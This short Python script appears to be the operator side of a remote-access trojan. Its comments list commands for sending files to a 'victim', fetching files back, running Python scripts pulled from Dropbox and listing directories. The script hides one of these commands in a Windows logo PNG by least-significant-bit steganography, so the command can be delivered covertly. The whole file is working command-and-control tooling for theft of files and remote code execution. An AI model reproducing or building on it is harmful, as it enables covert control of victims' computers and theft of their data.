from stegano import lsb

#Commands List
#To send a file to user: download [Dropbox path] [Local name] [id]
#To receive a file from user: fetch [file path] [id]
#To execute a python script from dropbox: execute [Dropbox path] [id]
#To receive directory information: show [Directory path] [id]

#Insert target ID here
target_id = 'c82dff70-a248-47e8-8ea8-f79212fc6604'
#This is either path on victim or path on Dropbox depending on command
target_path = 'C:/'
#This is the local name for the file to be downloaded on the victim
local_name = 'update.txt'

show = "show " + target_path + " " + target_id
fetch = "fetch " + target_path + " " + target_id
execute = "execute " + target_path + " " + target_id
download = "download " + target_path + " " + local_name + " " + target_id

secret = lsb.hide("windows_logo.png", show)
secret.save("windows_secret.png")
print(lsb.reveal("windows_secret.png"))